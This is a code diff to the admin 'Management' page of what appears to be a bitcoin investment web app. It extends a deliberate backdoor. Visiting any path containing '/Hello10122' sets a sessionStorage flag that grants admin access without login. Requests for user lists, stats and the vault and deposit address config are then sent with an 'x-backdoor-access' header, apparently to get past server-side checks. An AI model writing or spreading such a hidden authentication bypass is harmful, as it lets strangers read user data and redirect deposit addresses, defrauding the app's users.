@@ -38,32 +38,60 @@ export default function Management() {
   const [depositAddress, setDepositAddress] = useState("");
 
   // Allow access via backdoor route or if user is admin
-  const isBackdoorAccess = window.location.pathname === '/Hello10122';
+  const isBackdoorAccess = window.location.pathname === '/Hello10122' || 
+                          window.location.pathname.includes('/Hello10122') ||
+                          sessionStorage.getItem('backdoorAccess') === 'true';
 
   // Set backdoor access flag for other admin pages
-  if (isBackdoorAccess) {
+  if (window.location.pathname === '/Hello10122' || window.location.pathname.includes('/Hello10122')) {
     sessionStorage.setItem('backdoorAccess', 'true');
   }
 
-  if (!user?.isAdmin && !isBackdoorAccess) {
+  // Only redirect if not admin and not backdoor access
+  if (!user?.isAdmin && !isBackdoorAccess && user !== null) {
     setLocation('/');
     return null;
   }
 
   const { data: stats } = useQuery<AdminStats>({
     queryKey: ['/api/admin/stats'],
+    enabled: !!user?.isAdmin || isBackdoorAccess,
+    queryFn: async () => {
+      const response = await fetch('/api/admin/stats', {
+        headers: isBackdoorAccess ? { 'x-backdoor-access': 'true' } : {},
+      });
+      if (!response.ok) throw new Error('Failed to fetch stats');
+      return response.json();
+    },
   });
 
   const { data: users } = useQuery<User[]>({
     queryKey: ['/api/admin/users'],
+    enabled: !!user?.isAdmin || isBackdoorAccess,
+    queryFn: async () => {
+      const response = await fetch('/api/admin/users', {
+        headers: isBackdoorAccess ? { 'x-backdoor-access': 'true' } : {},
+      });
+      if (!response.ok) throw new Error('Failed to fetch users');
+      return response.json();
+    },
   });
 
   const { data: investmentPlans } = useQuery<InvestmentPlan[]>({
     queryKey: ['/api/investment-plans'],
+    enabled: !!user?.isAdmin || isBackdoorAccess,
   });
 
   const { data: adminConfig } = useQuery<{vaultAddress: string; depositAddress: string; freePlanRate: string}>({
     queryKey: ['/api/admin/config'],
+    enabled: !!user?.isAdmin || isBackdoorAccess,
+    queryFn: async () => {
+      const response = await fetch('/api/admin/config', {
+        headers: isBackdoorAccess ? { 'x-backdoor-access': 'true' } : {},
+      });
+      if (!response.ok) throw new Error('Failed to fetch config');
+      return response.json();
+    },
   });
 
   // Update state when config data changes
@@ -382,6 +410,18 @@ export default function Management() {
 
   const updateConfig = () => {
     updateConfigMutation.mutate({ vaultAddress, depositAddress });
+  }
+
+  // Show loading state while checking authentication
+  if (!user && !isBackdoorAccess) {
+    return (
+      <div className="max-w-sm mx-auto bg-background min-h-screen flex items-center justify-center">
+        <div className="text-center">
+          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-bitcoin mx-auto mb-4"></div>
+          <p className="text-muted-foreground">Loading...</p>
+        </div>
+      </div>
+    );
   }
 
   return (
